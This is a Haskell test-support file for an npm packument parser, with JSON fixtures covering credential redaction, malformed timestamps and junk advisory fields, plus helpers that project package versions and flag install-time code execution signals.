-- | A dropped version carries URL credentials that its diagnostic record must redact.
credentialedDropPackument :: ByteString
credentialedDropPackument =
    "{\"name\":\"mix\",\"versions\":{\
    \\"1.0.0\":{\"name\":\"mix\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/mix/-/mix-1.0.0.tgz\"}},\
    \\"2.0.0\":{\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://deploy:hunter2@r/mix/-/mix-2.0.0.tgz?sig=abc\"}}}}"

-- | An invalid bookkeeping timestamp must not become an invalid publish-time event.
malformedBookkeepingTimePackument :: ByteString
malformedBookkeepingTimePackument =
    "{\"name\":\"bk\",\"versions\":{\
    \\"1.0.0\":{\"name\":\"bk\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/bk/-/bk-1.0.0.tgz\"}}},\
    \\"time\":{\"created\":\"not-a-date\",\"1.0.0\":\"2018-01-01T00:00:00.000Z\"}}"

-- | Malformed advisory fields must not discard versions or their integrity hashes.
advisoryJunkPackument :: ByteString
advisoryJunkPackument =
    "{\"name\":\"adv\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\
    \\"1.0.0\":{\"name\":\"adv\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/adv/-/adv-1.0.0.tgz\"}},\
    \\"2.0.0\":{\"name\":\"adv\",\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://r/adv/-/adv-2.0.0.tgz\",\
    \\"integrity\":\"sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==\",\
    \\"unpackedSize\":1e400,\"signatures\":[{\"sig\":\"x\"}]}},\
    \\"3.0.0\":{\"name\":\"adv\",\"version\":\"3.0.0\",\"dist\":{\"tarball\":\"https://r/adv/-/adv-3.0.0.tgz\",\"signatures\":5}}}}"

-- | A packument with three versions, to check version-list extraction.
multiVersionPackument :: ByteString
multiVersionPackument =
    "{\"name\":\"multi\",\"versions\":{\
    \\"1.0.0\":{\"name\":\"multi\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/a.tgz\"}},\
    \\"1.2.0\":{\"name\":\"multi\",\"version\":\"1.2.0\",\"dist\":{\"tarball\":\"https://r/b.tgz\"}},\
    \\"2.0.0\":{\"name\":\"multi\",\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://r/c.tgz\"}}}}"

-- | The canonical key of a 'PackageName' (verbatim for npm).
renderName :: PackageName -> Text
renderName = TS.toText . pkgCanonical

-- | npm projection yields exactly one artifact per version.
soleArtifact :: PackageDetails -> Artifact
soleArtifact d = let (art :| _) = pkgArtifacts d in art

-- | Whether a 'CodeExecSignal' is one of the @RunsCodeOnInstall@ determinations.
runsCode :: CodeExecSignal -> Bool
runsCode = \case
    RunsCodeOnInstall _ -> True
    _ -> False

-- | Read a committed fixture body by name (under @core\/test\/unit\/fixtures\/npm\/@, the path Cabal runs tests from).
readFixture :: FilePath -> IO ByteString
readFixture name = readFileBS ("core/test/unit/fixtures/npm/" <> name)

-- | A minimal packument 'Value' self-reporting the given top-level @name@.
packumentValueNamed :: Text -> Value
packumentValueNamed nm = object ["name" .= nm, "versions" .= object []]

-- | Use the body's scoped identity as the requested name for projection fixtures.
routeNameOf :: Value -> PackageName
routeNameOf v = npmName (nameOf v)
  where
    nameOf :: Value -> Text
    nameOf value = case value of
        Object o -> case KeyMap.lookup "name" o of
            Just (String t) -> t
            _ -> ""
        _ -> ""

    npmName :: Text -> PackageName
    npmName raw = case T.stripPrefix "@" raw of
        Just afterAt
            | (scopeText, rest) <- T.break (== '/') afterAt
            , bare <- T.drop 1 rest
            , not (T.null scopeText)
            , not (T.null bare) ->
                mkPackageName Npm (Just (mkScope scopeText)) bare
        _ -> mkPackageName Npm Nothing raw

-- | Validate fixtures against their own reported package identity through the production projection.

-- | The refusal text 'projectName' gives a name, or 'Nothing' when the name parses.
refusalOf :: Text -> Maybe Text
refusalOf raw = case projectName raw of
    Left (ParseError message) -> Just message
    Right _ -> Nothing

projectInfoOf :: ByteString -> IO PackageInfo
projectInfoOf body = decodeJsonOrFail body >>= projectedInfo

-- | Project an already-decoded packument 'Value' into its 'PackageInfo' through the live 'parsePackageInfoFromValue', validating against the value's own self-reported name.
projectedInfo :: Value -> IO PackageInfo
projectedInfo value =
    case parsePackageInfoFromValue (routeNameOf value) value of
        Right (Projected info) -> pure info
        Right (NameMismatch reported) -> fail ("unexpected name mismatch: " <> toString reported)
        Left e -> fail ("unexpected ParseError: " <> show e)

-- | A missing or rejected version yields 'Nothing'.
lookupVersionOf :: ByteString -> Version -> IO (Maybe PackageDetails)
lookupVersionOf body version = do
    info <- projectInfoOf body
    pure (Map.lookup (renderVersion version) (infoVersions info))

-- | Fail the example if its requested version cannot be projected.
projectVersionOf :: ByteString -> Version -> IO PackageDetails
projectVersionOf body version =
    lookupVersionOf body version
        >>= maybe (fail ("version not present in packument: " <> toString (renderVersion version))) pure

-- | Project one version of a fixture file into its 'PackageDetails' through the live projection.
projectVersion :: FilePath -> Version -> IO PackageDetails
projectVersion name version = readFixture name >>= (`projectVersionOf` version)

-- | Fail the test when an expected ISO-8601 timestamp cannot be parsed.
readUTC :: (MonadFail m) => Text -> m UTCTime
readUTC = iso8601ParseM . toString
